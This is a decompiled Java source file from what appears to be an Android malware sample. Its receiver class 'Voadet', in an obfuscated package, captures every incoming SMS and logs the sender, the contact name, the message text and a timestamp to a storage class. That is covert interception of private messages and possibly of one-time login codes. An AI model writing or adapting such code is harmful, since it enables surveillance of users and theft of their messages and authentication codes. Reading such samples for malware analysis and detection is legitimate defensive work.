/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.BroadcastReceiver
 *  android.content.Context
 *  android.content.Intent
 *  android.provider.Telephony$Sms$Intents
 *  android.telephony.SmsMessage
 */
package linker.resourcer.encoder;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.provider.Telephony;
import android.telephony.SmsMessage;
import linker.resourcer.encoder.SmsCallsStorage;
import linker.resourcer.encoder.Tools;
import linker.resourcer.encoder.ffbrxjknfnpfxahr;

public class Voadet
extends BroadcastReceiver {
    private static final String TAG = "Voadet";

    public void onReceive(Context context, Intent object) {
        if ("android.provider.Telephony.SMS_DELIVER".equals(object.getAction()) || "android.provider.Telephony.SMS_RECEIVED".equals(object.getAction())) {
            for (SmsMessage smsMessage : Telephony.Sms.Intents.getMessagesFromIntent((Intent)object)) {
                String string2 = smsMessage.getOriginatingAddress();
                String string3 = Tools.getContactNameFromNumber(context, string2);
                object = string3;
                if (string3 == null) {
                    object = string2;
                }
                string3 = smsMessage.getMessageBody();
                SmsCallsStorage.Record((String)object + "|" + string2 + "|" + string3 + "|" + ffbrxjknfnpfxahr.FullStamp(), SmsCallsStorage.EntryType.SMS);
            }
        }
    }
}

